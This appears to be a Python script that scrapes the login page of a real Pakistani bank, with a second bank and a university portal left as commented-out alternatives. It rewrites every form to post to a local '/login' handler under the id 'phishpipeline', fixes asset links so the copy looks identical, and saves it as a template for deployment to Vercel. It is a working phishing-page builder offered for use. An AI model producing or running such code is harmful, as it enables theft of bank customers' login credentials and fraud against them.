import os
import requests
import subprocess
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Replace <login_page_url> with the actual login page URL
login_url = "https://www.hblibank.com.pk/Login"
#login_url = "https://netbanking.bankalfalah.com/ib/Login.aspx"
#login_url = "https://flexstudent.nu.edu.pk/Login"
base_url = "/".join(login_url.split("/")[:-1])

# Set the user agent to a commonly used one
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}

# Create a session
session = requests.Session()

# Set the headers for the session
session.headers.update(headers)

# Get the login page HTML
response = session.get(login_url)
html = response.content

# Parse the HTML using BeautifulSoup
soup = BeautifulSoup(html, "html.parser")

# Find all the forms in the HTML
forms = soup.find_all("form")

# Edit the forms to add the method and action attributes
for form in forms:
    form["id"] = "phishpipeline"
    form["method"] = "post"
    form["action"] = "/login"
    # Find all the buttons or input type=submit elements within the form
    buttons = form.find_all("button") + \
        form.find_all("input", {"type": "submit"})

    # Edit the buttons to add the ID attribute
    for button in buttons:
        button["id"] = "phishpipeline"

# Find all the assets (images, CSS, and JavaScript) in the HTML
assets = soup.find_all(["img", "link", "style", "script"])
style_tags = soup.find_all(lambda tag: tag.has_attr('style'))

# Resolve the URLs of the assets
for asset in assets:
    if asset.has_attr("src") and not asset["src"].startswith(('http://', 'https://', '//')):
        #asset["src"] = urljoin(base_url, asset["src"])
        asset["src"] = base_url + '/' + asset["src"]
    elif asset.has_attr("href") and not asset["href"].startswith(('http://', 'https://', '//')):
        #asset["href"] = urljoin(base_url, asset["href"])
        asset["href"] = base_url + '/' + asset["href"]

# Resolve the URLs of the assets in the style attribute
for style_tag in style_tags:
    style = style_tag['style']
    start_index = style.find('url(') + 4
    end_index = style.find(')', start_index)
    url_value = style[start_index:end_index]
    if not url_value.startswith(('http://', 'https://', '//')):
        url_value = urljoin(base_url, url_value.replace('\\', '/'))
    if url_value.startswith('http:/'):
        url_value = url_value.replace('http:/', 'http://')
    if url_value.startswith('https:/'):
        url_value = url_value.replace('https:/', 'https://')
    style_tag['style'] = style[:start_index] + url_value + style[end_index:]

# Save the updated HTML to a new file
with open("build/templates/index.html", "w", encoding="utf-8") as f:
    f.write(str(soup))

with open('/tmp/log.txt', 'w') as f:
    f.write('')

# Define the command to run
#command = "vercel --cwd build/ --yes"

# Run the command and capture the output
#output = subprocess.check_output(command, shell=True)

# Print the output
# print(output.decode())
